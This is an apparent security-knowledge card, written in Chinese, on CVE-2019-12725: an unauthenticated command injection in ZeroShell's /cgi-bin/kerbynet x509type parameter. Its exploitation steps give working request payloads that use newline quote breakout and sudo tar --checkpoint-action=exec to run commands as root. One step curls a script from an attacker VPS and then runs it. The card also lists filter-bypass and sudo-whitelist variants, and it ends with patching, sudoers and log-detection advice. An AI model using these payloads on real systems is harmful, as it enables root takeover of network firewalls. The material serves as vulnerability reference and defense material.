---
id: iot-zeroshell-kerbynet-x509type-unauth-command-injection
title: ZeroShell /cgi-bin/kerbynet 的 x509type 参数未授权命令注入（CVE-2019-12725）：用换行符跳出单引号，借 sudo tar --checkpoint-action=exec 执行任意命令
type: scenario
domain: iot
path: iot
technique: zeroshell-kerbynet-x509type-newline-command-injection
aliases:
- CVE-2019-12725
- ZeroShell 远程命令执行
- kerbynet x509view 注入
- x509type 换行注入
- sudo tar checkpoint-action 绕过
tags:
- iot
- firewall
- zeroshell
- command-injection
- cve-2019-12725
- cgi
- sudo
- unauthenticated
cve:
- CVE-2019-12725
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:37:47+08:00'
  notes: 已对照原文核对；本次核对未读取图片；x509type 的 %0A 换行跳出单引号、/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec 两层利用、curl 落地 a.sh 再执行、find / -name flag* 命中 /Database 与 /DB/_DB.001 均与正文一致；原文只写「明显看出是 rce payload」并给出请求串，未点名 CVE 编号也未给受影响版本区间，卡片上的 CVE-2019-12725 与 3.9.0 系据公开 CVE 记录（与本批另一篇同源文章一致）补注，affected_versions 未由原文支撑故未落盘；
---

## 一句话结论

ZeroShell 防火墙的 `/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ` 未做认证即把 `x509type` 参数拼进 shell 命令，单引号未过滤，提交 `x509type='%0A<命令>%0A'` 即可用换行跳出引号以 root 执行任意命令；当直接命令被限制时可用 `/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='<命令>'` 借 sudo 白名单执行。

## 原理

- **入口无认证**：`Section=NoAuthREQ` 分支在鉴权之前处理请求，`x509type` 直接进入后端 shell 命令行（`openssl`/`tar` 拼串），因此未登录即可注入。
- **换行跳出引号**：后端把参数包进单引号 `'...'` 后再交给 shell，单引号内的 `%0A`（换行）仍是普通字符，但换行之后拼接的命令串被 shell 当成**新的命令**执行，收尾再用一个 `'` 把剩余单引号闭合，语法完整。若过滤了 `;`、`|`、`&`，换行往往仍可通过。
- **sudo 白名单二次利用**：设备为 CGI 配置了免密 `sudo /etc/sudo`（或 `/etc/sudo tar ...`），`tar` 的 `--checkpoint-action=exec=` 支持执行任意命令，于是「只能跑 tar」被转化为任意命令执行，且继承 root 权限。
- **为什么用 tar 而不是直接 `cat`**：目标 shell 可能只允许特定二进制（sudo 规则白名单），把命令藏在 `--checkpoint-action=exec='...'` 里比直接调用 `/bin/sh` 更稳；`--checkpoint=1` 保证每处理一个文件触发一次动作。

## 触发条件

- ZeroShell（或同源 kerbynet CGI 设备）暴露 `/cgi-bin/kerbynet`。
- 后端把 `x509type`/`User` 等参数未转义拼进 shell 命令。
- 换行未被过滤；或存在 sudo/tar 之类可执行外部命令的白名单程序。

## 利用步骤

1. 探测入口：`GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=1`，返回正常页面即存在该 CGI。
2. 注入验证：`x509type=1%0Aid%0A`，观察回显或时间差。
3. 换行 + sudo tar 执行任意命令（回显型）：

```text
GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='ps%20-ef'%0A' HTTP/1.1
```

4. 无回显/需要交互时改为落地脚本再执行：

```text
x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27curl%20http://<vps>:6677/a.sh%20-o%20/tmp/a.sh%27%0A%27
x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27/tmp/a.sh%27%0A%27
```

5. 在拿到 shell 的上下文里搜目标文件（`find / -name flag*` 之类），设备数据目录、`/Database`、`/DB/_DB.001` 常是持久化数据位置。

简化 PoC（换行 + 直接命令）：

```text
x509type='%0Aid%0A'
```

## 变体与关联

- 参数位置变体：`User`、`Section`、`Action` 也常被拼进同一命令行，`x509type` 只是最常见的注入点。
- 过滤变体：`;`/`|`/`&`/空格被拦时用换行、`$IFS`、`${IFS}`、tab；单引号被转义时尝试 `%27` 与本 payload 的收尾引号配合，或改用双引号跳出。
- sudo 白名单变体：`tar --to-command`、`--use-compress-program`、`find -exec`、`vi/less` 的 `:!`/`!`、`awk` 的 `system()` 都是「白名单程序里能起子进程」的等价路径。
- 关联：tar 通配符式 `--checkpoint-action` 提权（本地 cron 备份场景）与本条「sudo 参数注入」原理同源，区别是本条由 Web 参数直达、无需等待 cron。

## 检测与防御

- 升级到修复版 ZeroShell（3.9.0 之后），或在边界阻断 `/cgi-bin/kerbynet` 的 `Section=NoAuthREQ` 访问。
- 所有外部参数进 shell 前做白名单校验（如 `x509type` 只允许枚举值），并改用参数数组（不走 shell 解释）。
- 收紧 sudoers：不给 CGI 配置 `NOPASSWD: /etc/sudo tar` 这类可执行外部命令的程序；GNU tar 的 `--checkpoint-action`、`--to-command` 应从 sudo 白名单中排除。
- 检测：Web 日志中出现 `/cgi-bin/kerbynet` 且参数含 `%0A`、`%27`、`tar`、`--checkpoint-action`；设备上出现异常 `sh -c` 子进程、`/tmp` 下新落地脚本、对外新建立的长连接。
